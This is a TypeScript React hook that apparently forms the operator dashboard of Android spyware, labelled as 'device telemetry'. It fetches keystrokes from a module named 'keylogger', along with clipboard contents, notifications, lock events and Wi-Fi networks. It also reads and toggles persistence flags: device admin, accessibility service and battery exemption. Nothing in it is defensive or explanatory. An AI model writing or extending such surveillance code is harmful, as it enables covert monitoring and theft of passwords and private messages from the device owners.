// hooks/useDeviceTelemetry.ts
"use client";

import { useState, useEffect, useCallback } from "react";
import {
  DeviceNotification,
  DeviceKeystroke,
  DeviceClipboardItem,
  DeviceLockEvent,
  DeviceWifiNetwork,
  DeviceTelemetryConfig,
} from "@/lib/device-telemetry-types";

export function useDeviceTelemetry(deviceId: string) {
  const [telemetryConfig, setTelemetryConfig] = useState<DeviceTelemetryConfig>({});
  const [persistenceStatus, setPersistenceStatus] = useState<{
    isAdmin?: boolean;
    isAccessibility?: boolean;
    isBatteryWhitelisted?: boolean;
    isNotificationActive?: boolean;
  }>({});
  const [currentSsid, setCurrentSsid] = useState<string | null>(null);

  const [notifications, setNotifications] = useState<DeviceNotification[]>([]);
  const [keystrokes, setKeystrokes] = useState<DeviceKeystroke[]>([]);
  const [clipboardItems, setClipboardItems] = useState<DeviceClipboardItem[]>([]);
  const [lockEvents, setLockEvents] = useState<DeviceLockEvent[]>([]);
  const [wifiNetworks, setWifiNetworks] = useState<DeviceWifiNetwork[]>([]);
  const [loading, setLoading] = useState(false);

  const fetchConfig = useCallback(async () => {
    if (!deviceId) return;
    try {
      const res = await fetch(`/api/devices/${deviceId}/telemetry-config?_t=${Date.now()}`, {
        cache: "no-store",
        headers: { "Cache-Control": "no-cache" },
      });
      if (res.ok) {
        const data = await res.json();
        setTelemetryConfig(data.telemetry_config || {});
        setPersistenceStatus({
          isAdmin: data.is_device_admin,
          isAccessibility: data.is_accessibility_active,
          isBatteryWhitelisted: data.is_battery_unrestricted,
          isNotificationActive: data.is_notification_active,
        });
        setCurrentSsid(data.current_wifi_ssid || null);
      }
    } catch {}
  }, [deviceId]);

  const fetchTelemetryData = useCallback(async (module: string) => {
    if (!deviceId) return;
    setLoading(true);
    const opts: RequestInit = { cache: "no-store", headers: { "Cache-Control": "no-cache" } };
    const t = Date.now();
    try {
      if (module === "notifications") {
        const res = await fetch(`/api/devices/${deviceId}/data/notifications?_t=${t}`, opts);
        if (res.ok) {
          const d = await res.json();
          setNotifications(d.notifications || []);
        }
      } else if (module === "keylogger") {
        const res = await fetch(`/api/devices/${deviceId}/data/keystrokes?_t=${t}`, opts);
        if (res.ok) {
          const d = await res.json();
          setKeystrokes(d.keystrokes || []);
        }
      } else if (module === "clipboard") {
        const res = await fetch(`/api/devices/${deviceId}/data/clipboard?_t=${t}`, opts);
        if (res.ok) {
          const d = await res.json();
          setClipboardItems(d.clipboard || []);
        }
      } else if (module === "security") {
        const [lRes, wRes] = await Promise.all([
          fetch(`/api/devices/${deviceId}/data/lock-events?_t=${t}`, opts),
          fetch(`/api/devices/${deviceId}/data/wifi?_t=${t}`, opts),
        ]);
        if (lRes.ok) {
          const ld = await lRes.json();
          setLockEvents(ld.events || []);
        }
        if (wRes.ok) {
          const wd = await wRes.json();
          setWifiNetworks(wd.networks || []);
        }
      }
    } catch {}
    setLoading(false);
  }, [deviceId]);

  const clearModuleData = useCallback(async (module: string) => {
    if (!deviceId) return;
    try {
      const res = await fetch(`/api/devices/${deviceId}/data/${module}`, { method: "DELETE" });
      if (res.ok) {
        if (module === "notifications") setNotifications([]);
        else if (module === "keystrokes") setKeystrokes([]);
        else if (module === "clipboard") setClipboardItems([]);
        else if (module === "wifi") setWifiNetworks([]);
      }
    } catch {}
  }, [deviceId]);

  useEffect(() => {
    fetchConfig();
    const iv = setInterval(fetchConfig, 10000);
    return () => clearInterval(iv);
  }, [fetchConfig]);

  const updatePersistenceStatus = useCallback(async (key: string, val: boolean) => {
    if (!deviceId) return;
    setPersistenceStatus((prev) => ({
      ...prev,
      [key === "is_accessibility_active" ? "isAccessibility" : key === "is_device_admin" ? "isAdmin" : "isBatteryWhitelisted"]: val,
    }));
    try {
      await fetch(`/api/devices/${deviceId}/telemetry-config`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ [key]: val }),
      });
      fetchConfig();
    } catch {}
  }, [deviceId, fetchConfig]);

  return {
    telemetryConfig,
    setTelemetryConfig,
    persistenceStatus,
    updatePersistenceStatus,
    currentSsid,
    notifications,
    keystrokes,
    clipboardItems,
    lockEvents,
    wifiNetworks,
    loading,
    fetchConfig,
    fetchTelemetryData,
    clearModuleData,
  };
}
